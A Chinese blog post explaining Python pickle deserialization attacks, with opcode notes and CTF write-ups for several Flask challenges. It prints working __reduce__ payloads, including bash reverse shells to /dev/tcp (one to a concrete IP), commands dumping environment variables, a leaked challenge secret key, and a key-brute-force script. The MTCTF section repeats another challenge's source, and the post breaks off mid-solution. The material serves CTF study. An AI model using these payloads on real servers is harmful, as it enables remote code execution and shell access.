@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pickle反序列化 | 红烧花园宝宝</title><meta name="author" content="红烧花园宝宝"><meta name="copyright" content="红烧花园宝宝"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言pickle模块基于python主要牵扯到两个函数，一个是dumps另一个是loads，类似于emmmm，php的serialize和unserialize方法，危害还是很大的，可以直接进行命令执行。 知识点 pickle.dumps(obj[, protocol])  1234功能：将obj对象序列化为string形式，而不是存入文件中。参数:obj：想要序列化的obj对象。protocal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pickle反序列化">
+<meta property="og:url" content="https://lxu2n.github.io/posts/2d71dd35/index.html">
+<meta property="og:site_name" content="红烧花园宝宝">
+<meta property="og:description" content="前言pickle模块基于python主要牵扯到两个函数，一个是dumps另一个是loads，类似于emmmm，php的serialize和unserialize方法，危害还是很大的，可以直接进行命令执行。 知识点 pickle.dumps(obj[, protocol])  1234功能：将obj对象序列化为string形式，而不是存入文件中。参数:obj：想要序列化的obj对象。protocal">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lxu2n.github.io/image/1.png">
+<meta property="article:published_time" content="2025-11-25T06:59:28.000Z">
+<meta property="article:modified_time" content="2025-11-25T07:01:14.288Z">
+<meta property="article:author" content="红烧花园宝宝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lxu2n.github.io/image/1.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pickle反序列化",
+  "url": "https://lxu2n.github.io/posts/2d71dd35/",
+  "image": "https://lxu2n.github.io/image/1.png",
+  "datePublished": "2025-11-25T06:59:28.000Z",
+  "dateModified": "2025-11-25T07:01:14.288Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "红烧花园宝宝",
+      "url": "https://lxu2n.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/6.png"><link rel="canonical" href="https://lxu2n.github.io/posts/2d71dd35/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pickle反序列化',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script></head><body><canvas id="bubble_canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:none"></canvas><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/styles/main.css"><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><meta name="generator" content="Hexo 7.3.0"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://lxu2n.github.io/image/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/6.png" alt="Logo"><span class="site-name">红烧花园宝宝</span></a><a class="nav-page-title" href="/"><span class="site-name">pickle反序列化</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">pickle反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-25T06:59:28.000Z" title="发表于 2025-11-25 14:59:28">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-25T07:01:14.288Z" title="更新于 2025-11-25 15:01:14">2025-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>pickle模块基于python主要牵扯到两个函数，一个是dumps另一个是loads，类似于emmmm，php的serialize和unserialize方法，危害还是很大的，可以直接进行命令执行。</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
+<li>pickle.dumps(obj[, protocol])</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">功能：将obj对象序列化为string形式，而不是存入文件中。</span><br><span class="line">参数:</span><br><span class="line">obj：想要序列化的obj对象。</span><br><span class="line">protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br></pre></td></tr></tbody></table></figure>
+
+<ol>
+<li>pickle.loads(string)</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">功能：从string中读出序列化前的obj对象。</span><br><span class="line">参数:</span><br><span class="line">string：文件名称。</span><br></pre></td></tr></tbody></table></figure>
+
+<p>总结来说，dumps是序列化成一个字符串，而loads是反序列化成一个对象。</p>
+<ol>
+<li>有关的魔术方法</li>
+</ol>
+<ul>
+<li><strong>reduce</strong>: 构造方法，在反序列化的时候自动执行</li>
+<li><strong>setstate</strong>:  在反序列化时自动执行。它可以在对象从其序列化状态恢复时，对对象进行自定义的状态还原。</li>
+</ul>
+<ol>
+<li>payload案例</li>
+</ol>
+<ul>
+<li>无os模块</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class A(object):  //创建一个新式类调用__reduce__方法</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,("__import__('os').popen('env').read()",))//最后一个,是创建一个单元素元组</span><br><span class="line"></span><br><span class="line">a=A()</span><br><span class="line">a=pickle.dumps(a);</span><br><span class="line">print(base64.b64encode(a))</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>有os模块</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return(os.system,('bash -c "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"',))</span><br><span class="line">a=A()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line">print(payload)</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><h4 id="使用opcode绕过过滤"><a href="#使用opcode绕过过滤" class="headerlink" title="使用opcode绕过过滤"></a>使用opcode绕过过滤</h4><p>opcode的介绍：</p>
+<p><strong>opcode</strong>又称为<em><strong>操作码</strong></em>，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。</p>
+<p>具体可参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7032#toc-11">https://xz.aliyun.com/news/7032#toc-11</a></p>
+<p>opcode在这里：<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Lib/pickle.py#L111">https://github.com/python/cpython/blob/main/Lib/pickle.py#L111</a></p>
+<p>可使用的工具为：<a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p>
+<p>opcode的解析：</p>
+<p><img src="/posts/2d71dd35/1763897409683-7703e47d-3bb8-461e-92ca-199539f75fbe.png" alt="img"></p>
+<p>获得对象入栈(代表一个MARK</p>
+<p><img src="/posts/2d71dd35/1763897442256-84b521f3-90ec-488f-9625-3db56a42c89e.png" alt="img"></p>
+<p>实例化一个字符串对象并且入栈</p>
+<p><img src="/posts/2d71dd35/1763897473630-caf81248-fd63-459b-b715-01c54af37a19.png" alt="img"></p>
+<p>将参数变成一个元组，这里的<code>/etc/passwd</code>是一个参数，我们最后用的是R操作符，所以参数一定要是一个元组，使用t操作符转换上一个MARK后的为元组，</p>
+<p><img src="/posts/2d71dd35/1763897525769-f49385eb-6088-4ebb-b785-73fabdbcd79a.png" alt="img"></p>
+<p>R将入栈的第一个元素作为函数，第二个为参数执行。</p>
+<p><img src="/posts/2d71dd35/1763897697908-1e199e49-f12f-45a9-bbbd-4c136319e367.png" alt="img"></p>
+<p>可以对应大佬列举的操作符的具体作用看，一定要看懂才会构造。</p>
+<h5 id="一些命令执行的payload"><a href="#一些命令执行的payload" class="headerlink" title="一些命令执行的payload"></a>一些命令执行的payload</h5><ul>
+<li>R：</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b'''cos //获取全局变量导入os模块</span><br><span class="line">system  //需要调用的函数名</span><br><span class="line">(S'whoami' </span><br><span class="line">tR.''' //转换成元组，并将whoami作为参数传入system</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>I：</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b'''(S'whoami' //参数要传给接下来导入的whoami</span><br><span class="line">ios //看下文</span><br><span class="line">system //需要调用的函数</span><br><span class="line">.'''</span><br></pre></td></tr></tbody></table></figure>
+
+<p>i：相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
+<ul>
+<li>o:</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b'''(cos</span><br><span class="line">system</span><br><span class="line">S'whoami'</span><br><span class="line">o.''</span><br></pre></td></tr></tbody></table></figure>
+
+<p>o:寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="不用使用opcode的题目"><a href="#不用使用opcode的题目" class="headerlink" title="不用使用opcode的题目"></a>不用使用opcode的题目</h3><h4 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h4><p>先看源代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3.6</span><br><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask import Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config["SECRET_KEY"] = "*******"</span><br><span class="line"></span><br><span class="line">User = type('User', (object,), {</span><br><span class="line">    'uname': 'test',</span><br><span class="line">    'is_admin': 0,</span><br><span class="line">    '__repr__': lambda o: o.uname,</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/', methods=('GET',))</span><br><span class="line">def index_handler():</span><br><span class="line">    if not session.get('u'):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session['u'] = u</span><br><span class="line">    return "/file?file=index.js"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/file', methods=('GET',))</span><br><span class="line">def file_handler():</span><br><span class="line">    path = request.args.get('file')</span><br><span class="line">    path = os.path.join('static', path)</span><br><span class="line">    if not os.path.exists(path) or os.path.isdir(path) \</span><br><span class="line">            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:</span><br><span class="line">        return 'disallowed'</span><br><span class="line"></span><br><span class="line">    with open(path, 'r') as fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/admin', methods=('GET',))</span><br><span class="line">def admin_handler():</span><br><span class="line">    try:</span><br><span class="line">        u = session.get('u')</span><br><span class="line">        if isinstance(u, dict):</span><br><span class="line">            u = b64decode(u.get('b'))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    except Exception:</span><br><span class="line">        return 'uhh?'</span><br><span class="line"></span><br><span class="line">    if u.is_admin == 1:</span><br><span class="line">        return 'welcome, admin'</span><br><span class="line">    else:</span><br><span class="line">        return 'who are you?'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    app.run('0.0.0.0', port=80, debug=False)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/posts/2d71dd35/1763728556875-0af80ce4-957d-498c-b476-6ee5545d6c45.png" alt="img"></p>
+<p>这是主要利用点，反序列化的位置，我们可以控制User这个类，执行恶意代码来获取flag</p>
+<p>通过session进行注入，先要伪造session，那么就要找密钥了，利用文件包含读取环境变量</p>
+<p><img src="/posts/2d71dd35/1763729427177-7966e616-8c39-48db-bd6c-9d6ffffd02fd.png" alt="img"></p>
+<p>这里的非预期解，当没看见</p>
+<p>secret key</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">glzjin22948575858jfjfjufirijidjitg3uiiuuh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对u中的b进行反序列化构造格式</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">{"u":{"b":"payload"}}</span><br><span class="line">User = type('User', (object,), {</span><br><span class="line">    'uname': 'test',</span><br><span class="line">    'is_admin': 0,</span><br><span class="line">    '__repr__': lambda o: o.uname,</span><br><span class="line">    '__reduce__': lambda o: (os.system, ('bash -c "bash -i &gt;&amp; /dev/tcp/8.140.236.137/9999 0&gt;&amp;1"',))</span><br><span class="line">})</span><br><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">User = type('User', (object,), {</span><br><span class="line">    'uname': 'test',</span><br><span class="line">    'is_admin': 0,</span><br><span class="line">    '__repr__': lambda o: o.uname,</span><br><span class="line">    '__reduce__': lambda o: (eval, ("__import__('os').system('cat /flag&gt;test')",))</span><br><span class="line">})</span><br><span class="line">user=pickle.dumps(User())</span><br><span class="line">print(base64.b64encode(user).decode())</span><br></pre></td></tr></tbody></table></figure>
+
+<p>emmm，反弹shell我是没弹出来但是能配合文件包含写文件，读flag</p>
+<p><img src="/posts/2d71dd35/1763776840759-00b5140c-5223-4fe7-bb2c-8f5c903e457f.png" alt="img"></p>
+<h4 id="HZNUCTF-2023-preliminary-pickle"><a href="#HZNUCTF-2023-preliminary-pickle" class="headerlink" title="[HZNUCTF 2023 preliminary]pickle"></a>[HZNUCTF 2023 preliminary]pickle</h4><p>先给出源码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/')</span><br><span class="line">def index():</span><br><span class="line">    with open('app.py', 'r') as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/calc', methods=['GET'])</span><br><span class="line">def getFlag():</span><br><span class="line">    payload = request.args.get("payload")</span><br><span class="line">    pickle.loads(base64.b64decode(payload).replace(b'os', b''))</span><br><span class="line">    return "ganbadie!"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/readFile', methods=['GET'])</span><br><span class="line">def readFile():</span><br><span class="line">    filename = request.args.get('filename').replace("flag", "????")</span><br><span class="line">    with open(filename, 'r') as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    app.run(host='0.0.0.0')</span><br></pre></td></tr></tbody></table></figure>
+
+<p>禁用了os，这题有个非预期是进行文件读取</p>
+<p><img src="/posts/2d71dd35/1764038320559-11ae8504-ec87-4ba4-8497-3f7d32164889.png" alt="img"></p>
+<p>直接读取环境变量，得到flag</p>
+<p>预期就是使用pickle了</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,("__import__('o'+'s').system('env | tee c')",))</span><br><span class="line">a=A()</span><br><span class="line">a=pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(a))</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/posts/2d71dd35/1764039289948-f288d149-21dd-4153-9650-7536da2ac7fd.png" alt="img"></p>
+<h3 id="使用opcode的题目"><a href="#使用opcode的题目" class="headerlink" title="使用opcode的题目"></a>使用opcode的题目</h3><h4 id="MTCTF-2022-easypickle"><a href="#MTCTF-2022-easypickle" class="headerlink" title="[MTCTF 2022]easypickle"></a>[MTCTF 2022]easypickle</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/')</span><br><span class="line">def index():</span><br><span class="line">    with open('app.py', 'r') as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/calc', methods=['GET'])</span><br><span class="line">def getFlag():</span><br><span class="line">    payload = request.args.get("payload")</span><br><span class="line">    pickle.loads(base64.b64decode(payload).replace(b'os', b''))</span><br><span class="line">    return "ganbadie!"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/readFile', methods=['GET'])</span><br><span class="line">def readFile():</span><br><span class="line">    filename = request.args.get('filename').replace("flag", "????")</span><br><span class="line">    with open(filename, 'r') as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    app.run(host='0.0.0.0')</span><br></pre></td></tr></tbody></table></figure>
+
+<p>由于使用的密钥是四位随机字符串，可以进行爆破，先生成对应的字典</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">file_path='./key.txt'</span><br><span class="line">with open(file_path, 'w') as f:</span><br><span class="line">    for i in range(1,100000):</span><br><span class="line">        key = os.urandom(2).hex()</span><br><span class="line">        f.write("\"{}\"\n".format(key))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后使用flask-unsign去爆破</p>
+<p><img src="/posts/2d71dd35/1764040765219-5ccf2fb9-4d51-4c70-8038-a648e6a45203.png" alt="img"></p>
+<p>成功</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4fd4</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/posts/2d71dd35/1764040849156-2d0df90b-996c-438f-97ee-18536b76384f.png" alt="img"></p>
+<p>这里没有用到a，可以直接pickle反序列化</p>
+<p>使用的payload应该是</p>
